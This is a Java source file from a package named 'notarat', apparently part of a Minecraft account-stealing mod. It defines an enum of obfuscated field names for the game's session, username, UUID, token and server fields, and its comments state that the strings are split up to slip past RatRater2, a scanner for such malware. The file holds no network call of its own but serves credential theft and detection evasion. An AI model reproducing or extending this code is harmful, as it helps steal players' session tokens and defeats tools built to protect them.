package me.ghosty.notarat;

/**
 * It's here in case I wanna add more later, or just for showcase
 * I know most strings won't be checked because there's no reason to, but STILL I want them cause it looks more dark and deep than just "username", "playerID", like WOW it's VERY hidden!!! (except "servers", cause it looks funny)
 */
enum Maps {
	
	v1_8(get(71432, "P"), get(71449, "j"), get(74286, "b"), get(148257, "b"), get(148258, "c"), get(78858, "b"), get(78847, "a"), get(78845, "b")),
	/** can still be useful for dev envs (aka faster tests, or just people using it in a IDE) */
	NOT_OBF(Utils.replaceUseless("*t h", "e* Mi n*", "ecr af", "*t"), Utils.replaceUseless("se* s", "si* on"), Utils.replaceUseless("us* ern*", "*am *e"), Utils.replaceUseless("p*la* ye", "r* ID*  "), Utils.replaceUseless("t* ok", "e*n  "), "servers", Utils.replaceUseless(" *ser *ve *r*Na*  m*e"), Utils.replaceUseless(" *ser *ve *r*I*  *P"));
	
	final String mc, sess, name, id, tok, servs, servName, serv314;
	
	/**
	 * I might use lombok at some point
	 * @param mc The minecraft instance field
	 * @param sess The session field
	 * @param name The username field
	 * @param id The UUID field
	 * @param tok The token field
	 * @param servs The servers field
	 * @param servName The server name field
	 * @param serv314 The server ip field (314 because of PI which is IP reversed, funny joke right?)
	 */
	Maps(String mc, String sess, String name, String id, String tok, String servs, String servName, String serv314) {
		this.mc = mc;
		this.sess = sess;
		this.name = name;
		this.id = id;
		this.tok = tok;
		this.servs = servs;
		this.servName = servName;
		this.serv314 = serv314;
	}
	
	/**
	 * Patch to RatRater2 which checks for defined strings
	 */
	private static String get(int num, String let) {
		return Utils.replaceUseless("f*  ", "iel* d_" + num, "_*" + let);
	}
	
}
